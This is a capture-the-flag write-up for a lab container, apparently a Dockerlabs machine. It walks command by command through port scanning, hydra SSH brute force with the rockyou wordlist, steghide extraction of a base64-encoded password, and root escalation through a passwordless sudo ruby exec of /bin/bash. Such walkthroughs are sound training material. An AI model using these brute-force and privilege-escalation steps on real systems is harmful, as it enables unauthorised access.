# IP
172.17.0.2
# Reconnaissance
## Host discovery
``` bash
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.129 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.039 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1027ms
rtt min/avg/max/mdev = 0.039/0.084/0.129/0.045 ms
```
## Ports scanning
``` bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 11:15 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 9E:0F:72:73:EF:75 (Unknown)
```
``` bash
sudo nmap -p22,80 -sS -sCV -T4 --min-rate 5000 -n -Pn 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 11:15 -0300
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 7e:72:b6:8b:5f:7c:23:64:dc:15:21:32:5f:ce:40:0a (ECDSA)
|_  256 05:8a:a7:27:0f:88:b9:70:84:ec:6d:33:dc:ce:09:6f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: SecurSEC S.L
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 9E:0F:72:73:EF:75 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```
# Web enumeration
``` bash
curl http://172.17.0.2
<section>
    <div class="entry">
        <h2>Ataque de phishing</h2>
        <p>Se detectó un intento de ataque de phishing dirigido a los empleados. Por favor, estén atentos y no proporcionen información confidencial por correo electrónico.</p>
    </div>
    <div class="entry">
        <h2>Actualización de software</h2>
        <p>Recordatorio: Asegúrese de mantener actualizados todos los programas y sistemas operativos en su dispositivo para protegerse contra vulnerabilidades de seguridad conocidas.</p>
    </div>
    <div class="entry">
        <h2>Contraseña débil detectada</h2>
        <p>Se ha identificado una contraseña débil en una cuenta de usuario. Por favor, cambie la contraseña por una más segura que incluya caracteres especiales y números.</p>
    </div>
    <div class="entry">
        <h2>¡Importante! Despido de empleado</h2>
        <p>Juan fue despedido de la empresa por enviar un correo con la contraseña a un compañero.</p>
        <p><strong>Firmado:</strong> Carlota, Departamento de ciberseguridad</p>
    </div>
    <div class="entry">
        <h2>Intento de acceso no autorizado</h2>
        <p>Se registraron múltiples intentos de acceso no autorizado a los servidores de la empresa desde una dirección IP desconocida. Se ha bloqueado el acceso y se está investigando el incidente.</p>
    </div>
    <div class="entry">
        <h2>Actualización de política de seguridad</h2>
        <p>Se ha actualizado la política de seguridad de la empresa. Por favor, revise los cambios y asegúrese de cumplir con las nuevas directrices para mantener un entorno seguro.</p>
    </div>
</section>
```
From this section i found two possible system users: *carlota* and *juan*
Also it says their password could be weak
# SSH
## Brute force with hydra
``` bash
cat > users.txt << EOF
juan
carlota
EOF
```
``` bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -u -F -V -t 4
[22][ssh] host: 172.17.0.2   login: carlota   password: babygirl
```
``` bash
ssh carlota@172.17.0.2
```
# Privilege escalation
``` bash
cat /etc/passwd | grep /bin/sh
carlota:x:1001:1001::/home/carlota:/bin/sh
oscar:x:1002:1002::/home/oscar:/bin/sh
```
## Lateral movement: carlota -> oscar
``` bash
cd Desktop/fotos/vacaciones
carlota@d5092e481400:~/Desktop/fotos/vacaciones$ python3 -m http.server 3000
```
``` bash
wget http://172.17.0.2:3000/imagen.jpg
imagen.jpg                                                    100%[===============================================================================================================================================>]  50.70K  --.-KB/s    in 0s
2026-10-07 11:36:44 (99.4 MB/s) - ‘imagen.jpg’ saved [51914/51914]
steghide extract -sf imagen.jpg
Enter passphrase:
wrote extracted data to "secret.txt".
cat secret.txt
ZXNsYWNhc2FkZXBpbnlwb24=
base64 -d secret.txt
eslacasadepinypon
```
This is most probably oscar's password
``` bash
su oscar
whoami
oscar
```
## Lateral movement: oscar -> root
``` bash
cat Desktop/IMPORTANTE.txt
Hola ROOT, acuérdate de mirar el documento de tu escritorio.
```
``` bash
sudo -l
(ALL) NOPASSWD: /usr/bin/ruby
```
``` bash
sudo -u root /usr/bin/ruby -e 'exec "/bin/bash"'
whoami
root
```
# Root
``` bash
cd /root
ls -la
total 24
drwx------ 1 root root 4096 Apr 26  2024 .
drwxr-xr-x 1 root root 4096 Oct  7 14:15 ..
-rw-r--r-- 1 root root 3106 Apr 22  2024 .bashrc
-rw-r--r-- 1 root root  161 Apr 22  2024 .profile
drwx------ 2 root root 4096 Apr 26  2024 .ssh
drwxr-xr-x 2 root root 4096 Apr 26  2024 Desktop
cat Desktop/THX.txt
Gracias a toda la comunidad de Dockerlabs y a Mario por toda la ayuda proporcionada para poder hacer la máquina.
```
